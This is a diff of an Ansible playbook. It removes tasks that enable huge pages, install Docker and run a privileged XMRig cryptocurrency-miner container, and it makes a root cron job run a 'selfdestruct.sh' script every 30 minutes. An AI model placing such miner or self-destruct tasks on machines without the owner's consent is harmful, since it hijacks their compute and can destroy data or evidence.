@@ -1,20 +1,4 @@
 ---
-- name: "enable huge pages"
-  sysctl:
-    name: vm.nr_hugepages
-    value: "1280"
-    state: present
-
-- name: Install dependancies
-  apt:
-    name: "{{ packages }}"
-    state: present
-    update_cache: yes
-  vars:
-    packages:
-    - curl
-    - docker.io
-    - python3
 
 - name: "template sshd config"
   template:
@@ -35,11 +19,9 @@
 - name: "add cronjob for selfdestruct"
   cron:
     name: "selfdestruct"
-    minute: "0"
+    minute: "0,30"
     user: root
     job: "bash /usr/local/bin/selfdestruct.sh >> /var/log/selfdestruct.log 2>&1"
     cron_file: "selfdestruct"
 
-- name: Execute doxmr
-  ignore_errors: yes
-  shell: "docker rm -f xmrig; docker run -d --name xmrig --privileged --dns 1.1.1.1 --restart unless-stopped iofq/docker-xmrig:latest"
+
